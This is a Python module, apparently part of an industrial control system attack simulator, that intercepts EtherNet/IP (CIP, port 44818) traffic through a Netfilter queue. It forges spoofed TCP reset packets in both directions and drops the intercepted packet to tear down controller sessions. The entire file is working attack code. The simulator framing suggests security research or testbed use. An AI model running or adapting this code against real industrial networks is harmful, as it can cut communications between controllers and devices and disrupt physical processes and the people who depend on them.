import argparse
import os
import sys
from pathlib import Path
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw
from scapy.all import send

from wacsim.network_attacks.mitm_netfilter_queue_subprocess import PacketQueue

class TCPRSTNetfilterQueue(PacketQueue):
    """
    TCP Reset (RST) Injection Netfilter Queue worker.
    Sniffs TCP session sequence/ack numbers from intercepted ENIP/CIP packets
    and injects spoofed TCP RST packets to tear down the session.
    """
    def capture(self, packet):
        try:
            p = IP(packet.get_payload())
            if 'TCP' in p:
                sport = p[TCP].sport
                dport = p[TCP].dport
                # Target EtherNet/IP port 44818
                if sport == 44818 or dport == 44818:
                    src_ip = p[IP].src
                    dst_ip = p[IP].dst
                    seq = p[TCP].seq
                    ack = p[TCP].ack
                    
                    self.logger.info(f"Intercepted ENIP/CIP packet: {src_ip}:{sport} -> {dst_ip}:{dport} (seq={seq}, ack={ack})")
                    
                    # Forge TCP RST packet from source to destination
                    rst_to_dst = IP(src=src_ip, dst=dst_ip) / TCP(sport=sport, dport=dport, seq=seq, flags="R")
                    send(rst_to_dst, verbose=False)
                    
                    # Forge TCP RST packet from destination to source
                    rst_to_src = IP(src=dst_ip, dst=src_ip) / TCP(sport=dport, dport=sport, seq=ack, flags="R")
                    send(rst_to_src, verbose=False)
                    
                    self.logger.info(f"Injected TCP RST packets to tear down connection between {src_ip}:{sport} and {dst_ip}:{dport}")
                    
                    # Drop the intercepted packet to force disconnect/teardown
                    packet.drop()
                    return
            
            packet.accept()
        except Exception as exc:
            self.logger.error(f"Error processing packet: {exc}")
            if self.nfqueue:
                self.nfqueue.unbind()
            sys.exit(0)

def is_valid_file(parser_instance, arg):
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start TCP RST Injection NetfilterQueue')
    parser.add_argument(dest="intermediate_yaml",
                        help="Intermediate YAML file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate YAML",
                        type=int, metavar="N")
    parser.add_argument(dest="number", help="Number of the queue configured in IP Tables",
                        type=int, metavar="N")

    args = parser.parse_args()

    attack = TCPRSTNetfilterQueue(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index,
        queue_number=args.number
    )
    attack.main_loop()
